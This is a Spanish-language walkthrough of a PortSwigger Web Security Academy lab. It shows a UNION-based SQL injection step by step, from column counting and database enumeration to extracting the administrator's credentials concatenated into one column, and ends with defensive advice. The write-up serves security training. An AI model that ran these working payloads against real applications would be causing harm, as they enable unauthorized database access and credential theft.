# SQL injection UNION attack, retrieving multiple values in a single column

**Categoría:** SQLi  
**Dificultad:** Practitioner  
**Fuente:** PortSwigger Web Security Academy

***

# 🎯 Resumen

*   **Objetivo del lab**: Usar un ataque `UNION` para recuperar múltiples valores (usuario y contraseña) en una sola columna, concatenándolos, y autenticarse como administrador.
*   **Vulnerabilidad principal**: SQL Injection en el parámetro `category`.
*   **Impacto esperado**: Exposición de credenciales y acceso privilegiado.

***

# 🧭 Reconocimiento

*   **Mapa de la aplicación**: `/filter?category=<valor>` filtra productos por categoría.
*   **Parámetro relevante**: `category`.
*   **Consulta SQL sospechada**:

    ```sql
    SELECT col1, col2 FROM products WHERE category = '<USER_INPUT>' AND released = 1
    ```
*   **Hipótesis**: Podemos alterar la consulta con `UNION SELECT` para acceder a otras tablas.

***

# 🛠️ Explotación paso a paso

## Paso 1 – Confirmar la inyección y número de columnas

*   **Qué hago**: Uso `ORDER BY` para determinar columnas:
    *   `ORDER BY 1` → OK
    *   `ORDER BY 2` → OK
    *   `ORDER BY 3` → Error
*   **Conclusión**: La consulta tiene **2 columnas**.

***

## Paso 2 – Probar `UNION SELECT NULL,NULL`

*   **Payload**:

    ```http
    GET /filter?category=Gifts' UNION SELECT NULL,NULL-- -
    ```
*   **Por qué funciona**: Coincide con el número de columnas.
*   **Evidencia**: Respuesta sin error → **No es Oracle** (en Oracle, `NULL,NULL` falla si no hay `FROM dual`).

***

## Paso 3 – Identificar columna que acepta texto

*   **Payload**:

    ```http
    GET /filter?category=Gifts' UNION SELECT NULL,'test'-- -
    ```
*   **Evidencia**: Funciona → La segunda columna acepta texto.

***

## Paso 4 – Identificar versión de la base de datos

*   **Payload exitoso**:

    ```http
    GET /filter?category=Gifts' UNION SELECT NULL,version()-- -
    ```
*   **Evidencia**:  
    `PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit`

***

## Paso 5 – Enumerar bases de datos (schemas)

*   **Payload**:

    ```http
    GET /filter?category=Gifts' UNION SELECT NULL,schema_name FROM information_schema.schemata-- -
    ```
*   **Evidencia**: Encontramos `public`.

***

## Paso 6 – Enumerar tablas del esquema `public`

*   **Payload**:

    ```http
    GET /filter?category=Gifts' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='public'-- -
    ```
*   **Evidencia**: Tabla `users`.

***

## Paso 7 – Enumerar columnas de la tabla `users`

*   **Payload**:

    ```http
    GET /filter?category=Gifts' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'-- -
    ```
*   **Evidencia**: Columnas `username` y `password`.

***

## Paso 8 – Extraer credenciales del administrador (concatenando en una sola columna)

*   **Payload final**:

    ```http
    GET /filter?category=Gifts' UNION SELECT NULL,username||':'||password FROM users WHERE username='administrator'-- -
    ```
*   **Por qué funciona**: Concatenamos usuario y contraseña con `||` en la columna que acepta texto.
*   **Evidencia**: Obtenemos `administrator:<password>` y completamos el lab autenticándonos.

***

# ✅ PoC mínima

```http
GET /filter?category=Gifts' UNION SELECT NULL,username||':'||password FROM users WHERE username='administrator'-- -
Host: <lab-id>.web-security-academy.net
```

***

# 🔒 Defensa

*   **Causas**: Concatenación directa de entrada en SQL.
*   **Detección en logs**:
    *   Parámetros con `UNION SELECT`
    *   Acceso a `information_schema`
*   **Mitigación recomendada**:
    *   Consultas parametrizadas (*prepared statements*)
    *   Validación estricta de entrada
    *   Principio de mínimo privilegio en la base de datos

***

# 📝 Notas y trampas

*   Si necesitas mostrar múltiples valores en una sola columna, usa concatenación (`||` en PostgreSQL).
*   Ajusta número de columnas y tipos antes de usar `UNION`.
*   Este patrón es común en labs donde la consulta original no tiene suficientes columnas para mapear todos los datos.

***

# 📚 Referencias

*   [PortSwigger Lab – SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
*   [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
